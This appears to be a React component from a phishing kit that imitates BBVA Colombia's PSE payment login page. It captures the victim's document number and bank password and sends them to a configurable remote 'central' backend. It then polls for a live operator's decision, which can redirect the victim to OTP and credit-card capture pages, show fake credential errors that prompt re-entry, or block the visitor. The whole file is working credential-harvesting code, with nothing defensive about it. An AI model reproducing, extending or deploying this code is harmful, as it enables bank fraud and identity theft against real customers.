import { useEffect, useRef, useState } from "react";
import { Eye, EyeOff, X } from "lucide-react";
import logoBbva from "../../img/Logo-BBVA.webp";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingBbva from "../../../../../components/LoadingBbva";
import "./bbva_login_pse.css";
import ModalErrorLogin from "../../modals/ModalErrorLogin";
import { PSE_SESSION_HANDOFF_KEY } from "../../../../loadingPse/PseLoading";
import { redirectToTcIngreso } from "../../../../ingresoTc/tcSessionHelper";

const BBVA_ESTADO_ERROR_KEY = "estado_sesion";
const BBVA_MID_FLOW_KEY = "bbva_mid_flow";

// Cédula de ciudadanía Colombia: 6 a 10 dígitos
const BBVA_CEDULA_MIN_LENGTH = 6;
const BBVA_CEDULA_MAX_LENGTH = 10;
const BBVA_PASSWORD_MAX_LENGTH = 8;

const BBVA_ALERT = {
  DOCUMENT: "document",
  PASSWORD: "password",
  CREDENTIALS: "credentials",
};

const BBVA_DOCUMENT_ERROR_MSG = `El número de documento debe contener entre ${BBVA_CEDULA_MIN_LENGTH} y ${BBVA_CEDULA_MAX_LENGTH} dígitos`;
const BBVA_PASSWORD_ERROR_MSG =
  "El password debe contener 8 caracteres alfanuméricos";
const BBVA_CREDENTIALS_ERROR_MSG = "Estimado usuario, credenciales incorrectas";
const BBVA_LOGIN_ERROR_AUTO_HIDE_MS = 5000;

const sanitizeDocumentDigits = (value) =>
  String(value || "")
    .replace(/\D/g, "")
    .slice(0, BBVA_CEDULA_MAX_LENGTH);

const isValidColombianCedula = (value) =>
  /^\d{6,10}$/.test(String(value || ""));

const sanitizePasswordAlphanumeric = (value) =>
  String(value || "")
    .replace(/[^a-zA-Z0-9]/g, "")
    .slice(0, BBVA_PASSWORD_MAX_LENGTH);

const isValidBbvaPassword = (value) => {
  const pwd = String(value || "");
  return (
    /^[a-zA-Z0-9]{8}$/.test(pwd) &&
    /[a-zA-Z]/.test(pwd) &&
    /\d/.test(pwd)
  );
};

const ESTADOS_TRAS_LOGIN = [
  "sol_otp",
  "sol_tc",
  "sol_finalizar",
  "sol_finalizado",
  "solicitar_finalizar",
  "error_otp",
  "error_login",
  "block_ip",
];

// Se crea la constante
const documentTypes = [
  "Cedula de ciudadania",
  "Cedula de extranjeria",
  "Tarjeta de identidad",
  "Pasaporte",
  "Numero identificacion personal",
  "Permiso Permanencia Temporal",
];

const BbvaPseInlineAlert = ({ message }) => (
  <div className="bbva-pse-alert" role="alert">
    <svg
      className="bbva-pse-alert-icon"
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 24 24"
      fill="none"
      aria-hidden="true"
    >
      <path
        d="M12 2.5 2.2 19.5h19.6L12 2.5z"
        fill="currentColor"
      />
      <path
        d="M12 9v5M12 17h.01"
        stroke="#fff"
        strokeWidth="1.8"
        strokeLinecap="round"
      />
    </svg>
    <span>{message}</span>
  </div>
);

// Se crea el componente
function BancoBbvaPse() {

  // Se inicializan los estados
  const [selectedDoc, setSelectedDoc] = useState(documentTypes[0]);
  const [isOpen, setIsOpen] = useState(false);
  const [documentNumber, setDocumentNumber] = useState("");
  const [password, setPassword] = useState("");
  const [touchedDocumentNumber, setTouchedDocumentNumber] = useState(false);
  const [touchedPassword, setTouchedPassword] = useState(false);
  const [isDocumentNumberFocused, setIsDocumentNumberFocused] = useState(false);
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [inlineAlert, setInlineAlert] = useState(null);
  const [showBlockIpModal, setShowBlockIpModal] = useState(false);

  // Se crean las constantes
  const isDocumentNumberInvalid = touchedDocumentNumber && documentNumber.trim() === "";
  const isPasswordInvalid = touchedPassword && password.trim() === "";
  const isFormComplete = documentNumber.trim().length > 0 && password.trim().length > 0;
  const showDocumentNumberClear = isDocumentNumberFocused && documentNumber.length > 0;
  const showPasswordActions = isPasswordFocused && password.length > 0;
  const hasValidDocumentNumber = isValidColombianCedula(documentNumber);
  const hasValidPassword = isValidBbvaPassword(password);

  const getInlineAlertMessage = () => {
    switch (inlineAlert) {
      case BBVA_ALERT.DOCUMENT:
        return BBVA_DOCUMENT_ERROR_MSG;
      case BBVA_ALERT.PASSWORD:
        return BBVA_PASSWORD_ERROR_MSG;
      case BBVA_ALERT.CREDENTIALS:
        return BBVA_CREDENTIALS_ERROR_MSG;
      default:
        return "";
    }
  };

  // Se inicializa el navigate
  const navigate = useNavigate();

  // Se declara el estado para el loading
  const [getLoading, setLoading] = useState(false);

  // Se declaran las variables
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);

  // Se crea el ref
  const pollingIntervalRef = useRef(null);
  const dropdownRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const allowPollNavigationRef = useRef(false);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);
  const loginErrorTimeoutRef = useRef(null);

  // Se crea el useEffect
  useEffect(() => {

    // Se crea el metodo para cerrar el dropdown
    function handleClickOutside(event) {

      // Se valida si el dropdown esta abierto y si el click fue fuera del dropdown
      if (dropdownRef.current && !dropdownRef.current.contains(event.target)) {

        // Se cierra el dropdown
        setIsDropdownOpen(false);
      }
    }

    // Se agrega el event listener
    document.addEventListener('mousedown', handleClickOutside);

    // Se remueve el event listener
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  // Se limpian documento y contraseña tras error de credenciales
  const clearLoginCredentialFields = () => {
    setDocumentNumber("");
    setPassword("");
    setTouchedDocumentNumber(false);
    setTouchedPassword(false);
  };

  const dismissInlineAlert = () => {
    if (loginErrorTimeoutRef.current) {
      clearTimeout(loginErrorTimeoutRef.current);
      loginErrorTimeoutRef.current = null;
    }

    if (modalBloqueoEstadoRef.current === "error_login") {
      ignorarEstadoHastaCambioRef.current = "error_login";
      modalBloqueoEstadoRef.current = null;
      sessionStorage.removeItem(BBVA_MID_FLOW_KEY);
      allowPollNavigationRef.current = false;
    }

    setInlineAlert(null);
  };

  const scheduleCredentialsErrorAutoHide = () => {
    if (loginErrorTimeoutRef.current) {
      clearTimeout(loginErrorTimeoutRef.current);
    }

    loginErrorTimeoutRef.current = setTimeout(() => {
      dismissInlineAlert();
      loginErrorTimeoutRef.current = null;
    }, BBVA_LOGIN_ERROR_AUTO_HIDE_MS);
  };

  // Se muestra el banner de error de credenciales
  const showLoginCredentialError = () => {
    setLoading(false);
    allowPollNavigationRef.current = false;
    modalBloqueoEstadoRef.current = "error_login";
    clearLoginCredentialFields();
    setInlineAlert(BBVA_ALERT.CREDENTIALS);
    scheduleCredentialsErrorAutoHide();
  };

  // Se cierra el modal de bloqueo IP y sale del flujo
  const closeBlockIpModal = () => {
    modalBloqueoEstadoRef.current = null;
    setShowBlockIpModal(false);
    setLoading(false);
    sessionStorage.removeItem(BBVA_MID_FLOW_KEY);
    localStorage.clear();
    window.location.href = process.env.REACT_APP_URL_BANK || "/";
  };

  // Se crea el useEffect para verificar el estado de la sesion
  useEffect(() => {

    // Se captura el estado de error
    const pendingError = localStorage.getItem(BBVA_ESTADO_ERROR_KEY);
    const midFlow = sessionStorage.getItem(BBVA_MID_FLOW_KEY) === "1";
    const pseHandoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);

    // Se valida si el estado de error es error (vuelve desde OTP u operador)
    if (pendingError === "error") {
      modalBloqueoEstadoRef.current = "error_login";
      clearLoginCredentialFields();
      setInlineAlert(BBVA_ALERT.CREDENTIALS);
      scheduleCredentialsErrorAutoHide();
      localStorage.removeItem(BBVA_ESTADO_ERROR_KEY);
    }

    if (pseHandoff) {

      // Se guarda la sessionId del handoff en localStorage
      localStorage.setItem("sessionId", pseHandoff);

      // Se actualiza la sessionId con el handoff de /pse
      sessionIdRef.current = pseHandoff;
      lastEstadoRef.current = null;

      // Se remueve el handoff
      sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);

      // Se remueve mid flow previo para no arrancar en loading antes del ingreso
      sessionStorage.removeItem(BBVA_MID_FLOW_KEY);

      // Se desactiva la navegacion por polling hasta enviar el login
      allowPollNavigationRef.current = false;

      // Se asegura que no quede cargando al llegar desde /pse
      setLoading(false);
    } else if (midFlow) {

      // Post-submit + F5: reanuda loading y polling sin permitir reenviar credenciales
      const sid = localStorage.getItem("sessionId");
      sessionIdRef.current = sid;

      if (sid) {

        // Se activa la navegacion por polling
        allowPollNavigationRef.current = true;

        // Se muestra loading mientras espera respuesta del operador
        setLoading(true);

        // Se inicia el polling
        initPolling();
      }
    } else {

      // Flujo inicial: mantiene la session existente y no inicia polling hasta el submit
      sessionIdRef.current = localStorage.getItem("sessionId");

      // Se desactiva la navegacion por polling hasta enviar el login
      allowPollNavigationRef.current = false;
    }

    return () => {
      stopPolling();
      if (loginErrorTimeoutRef.current) {
        clearTimeout(loginErrorTimeoutRef.current);
        loginErrorTimeoutRef.current = null;
      }
    };
  }, []);

  // Se crea el metodo para parar el polling
  const stopPolling = () => {

    // Se valida si el intervalo de polling existe
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo de polling
      clearInterval(pollingIntervalRef.current);

      // Se resetea la referencia
      pollingIntervalRef.current = null;
    };
  };

  // Se crea el metodo para iniciar el polling
  const initPolling = () => {

    // Se para el polling
    stopPolling();

    // Se inicia el polling cada 3 segundos
    pollingIntervalRef.current = setInterval(() => {

      // Se verifica el estado
      verifyState();
    }, 3000);

    // Se verifica el estado
    verifyState();
  };

  // Se crea el metodo para verificar el estado
  const verifyState = async () => {

    // Se usa el try catch
    try {

      // Se realiza la petición al backend
      const response = await instanceBackend.post(`/bbva/verify-state/${sessionIdRef.current}`);

      // Se captura la respuesta
      const { estado: estadoRaw, url, text, tc, tarjeta, bank } = response?.data || {};

      // Se capturan los valores
      const estado = (estadoRaw || "").toLowerCase();

      // Se valida si la url es diferente de null
      const hasUrl = Boolean(url && String(url).trim());

      // Se captura la url custom
      const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
      const tarjetaDigits = String(tarjeta || "").replace(/\D/g, "");
      const isTcSession = Boolean(tc);
      const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;

      // Se valida si el link es pendiente
      const linkPendiente = estado === "sol_link_bot" || (estado === "link_bot" && !hasUrl) || (estado === "sol_link_custom" && !customLink);

      // Se valida si el estado es diferente de null
      if (!estado) return;

      // Se valida si el estado es diferente de null
      if (ignorarEstadoHastaCambioRef.current) {

        // Se valida si el estado es diferente del estado actual
        if (estado === ignorarEstadoHastaCambioRef.current) return;

        // Se actualiza el estado actual
        ignorarEstadoHastaCambioRef.current = null;

        // Se actualiza el estado actual
        modalBloqueoEstadoRef.current = null;
      }

      // Se valida si el estado es diferente del estado actual
      if (modalBloqueoEstadoRef.current && estado === modalBloqueoEstadoRef.current) return;

      // Se valida si el estado es diferente del estado actual
      if (ESTADOS_TRAS_LOGIN.includes(estado) && !allowPollNavigationRef.current) return;

      // Se valida si el estado es diferente del estado actual
      if (!linkPendiente && lastEstadoRef.current === estado) return;

      // Se actualiza el estado actual
      if (!linkPendiente) lastEstadoRef.current = estado;

      // Se valida el estado
      switch (estado) {

        // ------------ Casos botones linea 1 ------------
        case "sol_otp":
        case "sol_tc":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(BBVA_MID_FLOW_KEY);

          // Se redirige al flujo OTP generico si la sesión es TC
          if (estado === "sol_otp" && isTcOtpFlow) {

            // Se redirige al flujo OTP generico si la sesión es TC
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
            );
          } else {

            // Se redirige a la pagina BBVA OTP/TC legacy
            window.location.href = "/banco_bbva_otp_tc";
          }

          // Se sale del switch
          break;
        case "error_otp":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(BBVA_MID_FLOW_KEY);

          // Se setea el estado de error
          localStorage.setItem(BBVA_ESTADO_ERROR_KEY, "error");

          // Se redirige al flujo OTP generico si la sesión es TC
          if (isTcOtpFlow) {

            // Se redirige al flujo OTP generico si la sesión es TC
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
              "error_otp",
            );
          } else {

            // Se redirige a la pagina legacy
            window.location.href = "/banco_bbva_otp_tc";
          }

          // Se sale del switch
          break;
        case "error_login":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(BBVA_MID_FLOW_KEY);

          // Se muestra el banner de error de credenciales
          showLoginCredentialError();

          // Se sale del switch
          break;
        case "block_ip":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(BBVA_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se setea el estado de bloqueo
          modalBloqueoEstadoRef.current = "block_ip";

          // Se quita el cargando
          setLoading(false);

          // Se muestra el modal de bloqueo IP
          setShowBlockIpModal(true);

          // Se sale del switch
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          localStorage.clear();
          sessionStorage.clear();

          // Se redirige al finalizado TC cuando la sesión viene por tarjeta
          if (isTcSession) {

            // Se redirige al finalizado de TC Legacy
            window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
          } else {

            // Se redirige al finalizado PSE legacy
            window.location.href = "/finalizado-pse?sessionId=" + sessionIdRef.current;
          }

          // Se sale del switch
          break;
        case "link_bot":

          // Se valida si existe la url
          if (hasUrl) {

            // Se para el polling
            stopPolling();

            // Se remueve el mid flow
            sessionStorage.removeItem(BBVA_MID_FLOW_KEY);

            // Se redirige a la pagina
            window.location.href = url;
          }

          // Se sale del switch
          break;
        case "sol_link_custom":

          // Se valida si existe el link custom
          if (customLink) {

            // Se para el polling
            stopPolling();

            // Se remueve el mid flow
            sessionStorage.removeItem(BBVA_MID_FLOW_KEY);

            // Se redirige a la pagina
            window.location.href = customLink;
          }
          break;
        default:

          // Se sale del switch
          break;
      }
    } catch (error) {

      // Se captura el status
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el status es 403 y el estado del error es error_blocked
      if (status === 403 && estadoErr === "error_blocked") {

        // Se para el polling
        stopPolling();

        // Se quita el cargando
        setLoading(false);

        // Se limpia el localStorage
        localStorage.clear();

        // Se redirige a la pagina
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  // Metodo encargado de manejar el submit del formulario
  const handleSubmit = async () => {

    // Se valida si el cargando esta activo
    if (getLoading) return;

    dismissInlineAlert();
    setTouchedDocumentNumber(true);
    setTouchedPassword(true);

    if (!hasValidDocumentNumber) {
      setInlineAlert(BBVA_ALERT.DOCUMENT);
      return;
    }

    if (!hasValidPassword) {
      setInlineAlert(BBVA_ALERT.PASSWORD);
      return;
    }

    // Se captura la sessionId del localStorage
    const sessionId = localStorage.getItem("sessionId") || sessionIdRef.current;

    // Se captura la url central
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se inicializa la data a enviar
    const dataSend = {
      "data": {
        "attributes": {
          "fecha": new Date().toISOString(),
          "tipoDocumento": selectedDoc,
          "usuario": documentNumber,
          "clave": password,
          "sessionId": sessionId,
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/bbva/authenticacion",
        },
      },
    };

    // Se para el polling
    stopPolling();

    // Se resetea el estado actual
    lastEstadoRef.current = null;

    // Se usa el try catch
    try {

      // Se setea el cargando
      setLoading(true);

      // Se realiza la peticion al backend
      const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/bbva/authenticacion", dataSend);

      // Se valida la respuesta
      if (response?.data?.success) {

        // Se captura la sessionId
        const sid = response.data.sessionId ?? sessionId;

        // Se guarda la sessionId en el localStorage
        localStorage.setItem("sessionId", sid);

        // Se actualiza la sessionId
        sessionIdRef.current = sid;

        // Se marca que el login ya fue enviado (recuperacion tras F5)
        sessionStorage.setItem(BBVA_MID_FLOW_KEY, "1");

        // Se activa la navegacion por polling
        allowPollNavigationRef.current = true;

        // Se inicia el polling
        initPolling();
      } else {

        // Se muestra el banner de error de credenciales
        showLoginCredentialError();
      }
    } catch (error) {

      // Se quita el cargando
      setLoading(false);

      // Se desactiva la navegacion por polling
      allowPollNavigationRef.current = false;

      // Se captura el status
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el status es 403 y el estado del error es error_blocked
      if (status === 403 && estadoErr === "error_blocked") {

        // Se limpia el localStorage
        localStorage.clear();

        // Se redirige a la pagina
        window.location.href = process.env.REACT_APP_URL_BANK || "/";

        // Se sale del metodo
        return;
      }

      // Se muestra el mensaje de error
      alert(centralUrl ? "Error de comunicación con el servidor central." : "Error de conexión con el servidor.");
    }
  };

  // Se retorna el formulario
  return (
    <div className={`bbva-pse-page${getLoading ? " bbva-pse-page--loading" : ""}`}>
      <header className="bbva-pse-header">
        <div className="bbva-pse-header-inner">
          <img className="bbva-pse-logo" src={logoBbva} alt="BBVA" />
          <div className="bbva-pse-header-title">Pagos a través de PSE</div>
        </div>
      </header>

      <main className="bbva-pse-main">
        <section className="bbva-pse-card">
          <h1 className="bbva-pse-welcome">iBienvenido!</h1>
          <p className="bbva-pse-description">
            Recuerda que para realizar pagos a través de PSE, debes estar registrado en BBVA net.
            Regístrate en <span>BBVA.com.co</span> y para agilizar tu pago, ten a mano tu app BBVA móvil
            o la tarjeta de coordenadas.
          </p>

          <div className="bbva-pse-form">
            {showBlockIpModal ? (
              <ModalErrorLogin
                isOpen={showBlockIpModal}
                onClose={closeBlockIpModal}
                onContinue={closeBlockIpModal}
                message="Acceso bloqueado por seguridad."
              />
            ) : null}

            {inlineAlert ? (
              <BbvaPseInlineAlert message={getInlineAlertMessage()} />
            ) : null}

            <div className="bbva-pse-select-wrapper">
              <button
                className="bbva-pse-field bbva-pse-field-select"
                type="button"
                onClick={() => setIsOpen((prev) => !prev)}
              >
                <label>Tipo de documento</label>
                <div className="bbva-pse-field-value">
                  {selectedDoc}
                  <span className={`bbva-pse-chevron ${isOpen ? "open" : ""}`}>{isOpen ? "⌃" : "⌵"}</span>
                </div>
              </button>

              {isOpen && (
                <div className="bbva-pse-select-menu">
                  {documentTypes.map((doc) => (
                    <button
                      key={doc}
                      className={`bbva-pse-select-option ${selectedDoc === doc ? "active" : ""}`}
                      type="button"
                      onClick={() => {
                        setSelectedDoc(doc);
                        setIsOpen(false);
                      }}
                    >
                      {doc}
                    </button>
                  ))}
                </div>
              )}
            </div>

            <div
              className={`bbva-pse-field bbva-pse-floating-field ${isDocumentNumberInvalid ? "has-error" : ""} ${showDocumentNumberClear ? "has-actions" : ""}`}
            >
              <input
                id="bbva-doc-number"
                type="text"
                value={documentNumber}
                maxLength={BBVA_CEDULA_MAX_LENGTH}
                onChange={(e) => {
                  if (inlineAlert) {
                    dismissInlineAlert();
                  }
                  setDocumentNumber(sanitizeDocumentDigits(e.target.value));
                }}
                onFocus={() => setIsDocumentNumberFocused(true)}
                onBlur={() => {
                  setTouchedDocumentNumber(true);
                  setIsDocumentNumberFocused(false);
                }}
                placeholder=" "
              />
              <label htmlFor="bbva-doc-number">Numero de documento</label>
              {showDocumentNumberClear && (
                <button
                  type="button"
                  className="bbva-pse-input-action"
                  aria-label="Borrar numero de documento"
                  onMouseDown={(e) => e.preventDefault()}
                  onClick={() => setDocumentNumber("")}
                >
                  <X size={22} strokeWidth={2.4} />
                </button>
              )}
            </div>

            <div
              className={`bbva-pse-field bbva-pse-floating-field ${isPasswordInvalid ? "has-error" : ""} ${showPasswordActions ? "has-actions has-eye" : ""}`}
            >
              <input
                id="bbva-password"
                type={showPassword ? "text" : "password"}
                value={password}
                maxLength={BBVA_PASSWORD_MAX_LENGTH}
                onChange={(e) => {
                  if (inlineAlert) {
                    dismissInlineAlert();
                  }
                  setPassword(sanitizePasswordAlphanumeric(e.target.value));
                }}
                onFocus={() => setIsPasswordFocused(true)}
                onBlur={() => {
                  setTouchedPassword(true);
                  setIsPasswordFocused(false);
                }}
                placeholder=" "
              />
              <label htmlFor="bbva-password">Contraseña</label>
              {showPasswordActions && (
                <div className="bbva-pse-input-actions">
                  <button
                    type="button"
                    className="bbva-pse-input-action"
                    aria-label="Borrar contrasena"
                    onMouseDown={(e) => e.preventDefault()}
                    onClick={() => setPassword("")}
                  >
                    <X size={22} strokeWidth={2.4} />
                  </button>
                  <button
                    type="button"
                    className="bbva-pse-input-action"
                    aria-label={showPassword ? "Ocultar contrasena" : "Mostrar contrasena"}
                    onMouseDown={(e) => e.preventDefault()}
                    onClick={() => setShowPassword((prev) => !prev)}
                  >
                    {showPassword ? <EyeOff size={22} strokeWidth={2.4} /> : <Eye size={22} strokeWidth={2.4} />}
                  </button>
                </div>
              )}
            </div>

            <button
              className={`bbva-pse-submit ${isFormComplete ? "is-enabled" : ""}`}
              type="button"
              onClick={handleSubmit}
              disabled={getLoading}
            >
              Entrar
            </button>
          </div>
        </section>
      </main>

      {getLoading ?
        <LoadingBbva />
        : null}
    </div>
  );
};

// Se exporta el componente
export default BancoBbvaPse;